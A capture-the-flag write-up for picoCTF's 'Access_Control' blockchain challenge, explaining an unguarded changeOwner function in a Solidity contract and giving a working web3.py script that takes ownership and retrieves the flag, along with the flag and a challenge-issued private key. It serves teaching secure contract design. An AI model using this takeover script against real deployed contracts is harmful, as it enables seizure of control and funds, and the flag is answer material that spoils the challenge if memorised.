# Access_Control — picoCTF Writeup

**Challenge:** Access_Control  
**Category:** Blockchain  
**Difficulty:** Medium  
**Points:** 200  
**Flag:** `picoCTF{i_c4n_b3_0wn3r_f4edb36e}`  
**Platform:** picoCTF (2025)  
**Writeup by:** zham

---

## Description

> We've created a simple contract to store a secret flag. But you currently are not the owner of the contract... Only the owner of the contract should be able to access it. We're sure we've made it secure this time. Contract: here
>
> The eth chain is at:
>
> `Eth node address: lonely-island.picoctf.net:54164` More details can be found at here.
>
> NOTE: this server can take up to 5 minutes to start up. Please be patient.

---

## Hints

**Hint 1:** Wait, maybe you can be the owner?

---

## Background Knowledge (Read This First!)

### What is a smart contract?

A smart contract is a program that lives on the Ethereum blockchain. Once deployed, it runs exactly as written — no company or admin can secretly change it. Anyone can read its public code and call its public functions by sending a transaction.

### What is Solidity?

Solidity is the programming language used to write Ethereum smart contracts. A `.sol` file compiles down to bytecode that the Ethereum Virtual Machine (EVM) executes on-chain.

### Key Solidity concepts used here

**`msg.sender`** — The address of whoever is calling the current function. Used in access control checks like `require(msg.sender == owner)`.

**`public` function** — Any address on the network can call it. No restrictions unless you explicitly add them.

**`require(condition, "error")`** — Reverts the transaction if the condition is false. This is how access control is normally enforced.

**`event`** — A log entry written to the blockchain. The `FlagRevealed` event in this contract emits the flag when `solve()` is called successfully.

**`private` variable** — Prevents other contracts from reading it directly, but the raw storage is still on-chain and readable. `private` is not a secrecy mechanism — the `revealed` gate is what actually protects the flag.

### What is an access control vulnerability?

Access control in Solidity means restricting who can call a function. The standard pattern:

```solidity
function changeOwner(address _newOwner) public {
    require(msg.sender == owner, "Not owner");  // this line guards the function
    owner = _newOwner;
}
```

If the `require` check is missing, any wallet can call the function. That is exactly what this challenge does — `changeOwner` is wide open.

---

## Step-by-Step Solution

### Step 0: Read the contract

```
┌──(zham㉿kali)-[~]
└─$ cat AccessControl.sol
```

The vulnerability is on line 18 — `changeOwner` is `public` with no access check:

```solidity
function changeOwner(address _newOwner) public {
    address oldOwner = owner;
    owner = _newOwner;                    // sets owner to whoever we want
    emit OwnerChanged(oldOwner, _newOwner);
}

function solve() public {
    require(msg.sender == owner, "Only the owner can get the flag.");
    if (!revealed) {
        revealed = true;
        emit FlagRevealed(flag);          // emits the flag as an event
    }
}

function getFlag() public view returns (string memory) {
    require(revealed, "Challenge not yet solved!");
    return flag;
}
```

The attack path: call `changeOwner(our_address)` → call `solve()` as owner → call `getFlag()`.

---

### Step 1: Get contract details from the info page

Visit the "More details" link in the challenge. It opens a page at a separate port:

```
http://lonely-island.picoctf.net:58781
```

This page shows three values:

- **Contract Address:** `0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9`
- **Your Private Key:** `0xdfc96dab4d8b0d6f1a9daea4ff69854e0c574173f7d10266e06123be70d16e72`
- **Your Address:** `0x6e10aD260380B50bb60528d0A4063Ab26C81c184`

Set them as variables:

```
┌──(zham㉿kali)-[~]
└─$ export RPC_URL="http://lonely-island.picoctf.net:54164"
export CONTRACT="0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
export MY_ADDRESS="0x6e10aD260380B50bb60528d0A4063Ab26C81c184"
export PRIVATE_KEY="0xdfc96dab4d8b0d6f1a9daea4ff69854e0c574173f7d10266e06123be70d16e72"
```

---

### Step 2: Install Foundry (attempted first)

```
┌──(zham㉿kali)-[~]
└─$ curl -L https://foundry.paradigm.xyz | bash
┌──(zham㉿kali)-[~]
└─$ source /home/zham/.zshenv && foundryup
```

Foundry installs successfully. However, `cast send` fails against this node with:

```
Error: Failed to estimate gas: server returned an error response: error code -32602:
duplicate field `data` at line 1 column 256
```

This is a known incompatibility between newer `cast` versions and some custom Ethereum nodes used in picoCTF — the node's JSON-RPC rejects requests that include both `input` and `data` fields simultaneously, which newer cast sends by default. Even `--legacy` does not resolve it on this node.

---

### Step 3: Solve with web3.py instead

```
┌──(zham㉿kali)-[~]
└─$ pip install web3 --break-system-packages
┌──(zham㉿kali)-[~]
└─$ nano solve.py
```

Paste this:

```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://lonely-island.picoctf.net:54164"))
contract_address = Web3.to_checksum_address("0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9")
my_address  = "0x6e10aD260380B50bb60528d0A4063Ab26C81c184"
private_key = "0xdfc96dab4d8b0d6f1a9daea4ff69854e0c574173f7d10266e06123be70d16e72"

abi = [
    {"inputs":[{"name":"_newOwner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"getFlag","outputs":[{"name":"","type":"string"}],"stateMutability":"view","type":"function"},
]

contract = w3.eth.contract(address=contract_address, abi=abi)

def send(fn):
    tx = fn.build_transaction({
        'from': my_address,
        'nonce': w3.eth.get_transaction_count(my_address),
        'gas': 100000,
        'gasPrice': w3.eth.gas_price,
    })
    signed = w3.eth.account.sign_transaction(tx, private_key)
    receipt = w3.eth.wait_for_transaction_receipt(
        w3.eth.send_raw_transaction(signed.raw_transaction)
    )
    print(f"  tx: {receipt.transactionHash.hex()}  status: {receipt.status}")

print("Taking ownership...")
send(contract.functions.changeOwner(my_address))

print("Calling solve()...")
send(contract.functions.solve())

print("Flag:", contract.functions.getFlag().call())
```

Ctrl+O, Enter, Ctrl+X to save.

```
┌──(zham㉿kali)-[~]
└─$ python3 solve.py
Taking ownership...
  tx: b573c07b871f80c0cbe0244948816a45c1b0bcdafd8a39e37579201fdd1a6987  status: 1
Calling solve()...
  tx: cc9e9a92d88cbd0e864feaf84e5d282fa7a63d5d772196fe60e4804628746419  status: 1
Flag: picoCTF{i_c4n_b3_0wn3r_f4edb36e}
```

---

## What Happened Internally

```
[1] Contract deployed. Deployer becomes owner. Flag stored in private `flag` var.
    revealed = false. getFlag() is locked behind revealed == true.

[2] changeOwner(address) is public with zero access check.
    The name implies it should be owner-only, but there is no require.

[3] We call changeOwner(our_address).
    EVM sets owner = our_address. OwnerChanged event emitted.
    No validation occurred at any point.

[4] We call solve(). msg.sender == owner (us) → require passes.
    revealed = true. FlagRevealed(flag) emitted to transaction logs.

[5] We call getFlag(). require(revealed) → true. Returns flag string.
    picoCTF{i_c4n_b3_0wn3r_f4edb36e}
```

---

## Tools Used

| Tool      | Purpose                                                          |
|-----------|------------------------------------------------------------------|
| web3.py   | Build, sign, and send transactions to the custom Ethereum node   |
| pip       | Install web3.py                                                  |
| Foundry   | Installed but unusable on this node (duplicate `data` field bug) |
| Browser   | Retrieve contract address and private key from info page         |

---

## Key Takeaways

- **`public` does not mean "only the owner"** — any function marked `public` can be called by any address. Access control must be added explicitly with a `require` check or an `onlyOwner` modifier.
- **One missing line = full ownership takeover** — the fix here is one line: `require(msg.sender == owner, "Not owner");` at the top of `changeOwner`. Without it, ownership is free for anyone to claim.
- **`private` does not mean "secret"** — the `flag` variable is `private`, but all EVM storage is readable on-chain by querying storage slots directly. The `revealed` gate is what actually guards the flag, not the `private` keyword.
- **Node compatibility matters** — `cast` from Foundry v1.7.1 sends both `input` and `data` fields in JSON-RPC calls, which some custom CTF nodes reject. `web3.py` builds leaner requests and works where cast fails.
- **Read the source before anything else** — the vulnerability was visible in under 10 seconds. A `public` function modifying `owner` with no guard is the entire bug.

**Flag wordplay decode:** `picoCTF{i_c4n_b3_0wn3r_f4edb36e}` = "I can be owner" — because `changeOwner` never checked if you were allowed to.
